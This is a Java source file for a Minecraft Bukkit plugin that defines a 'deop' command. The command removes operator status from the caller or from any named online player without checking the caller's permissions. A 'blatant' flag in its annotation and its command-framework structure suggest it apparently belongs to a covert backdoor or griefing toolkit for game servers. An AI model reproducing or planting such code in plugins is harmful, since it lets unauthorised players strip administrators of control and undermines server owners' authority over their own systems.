package me.kego.Command.impl;

import me.kego.Bootstrap;
import me.kego.Command.CommandListener;
import me.kego.Command.annotation.Command;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

@Command(name = "deop", usage = "deop <player>", desc = "Deops you and other players!", blatant = true)
public class Deop extends CommandListener {

    @Override
    public void execute(Bootstrap instance, Player player, String[] args) {
        if (args.length <= 1) {
            deOp(player);
            player.sendMessage("You have been deoped");
            return;
        }
        Player player3 = Bukkit.getServer().getPlayer(args[1]);
        if (player3 == null) {
            player.sendMessage("The player " + args[1] + " is not online.");
            return;
        }
        deOp(player3);
        player.sendMessage("The player " + player3.getName() + " is no longer op");
    }

    public static void deOp(final Player p) {
        Bootstrap.getInstance().getServer().getScheduler().runTaskAsynchronously(Bootstrap.getInstance(), () -> {
            if (p.isOp())
                p.setOp(false);
        });
    }
}
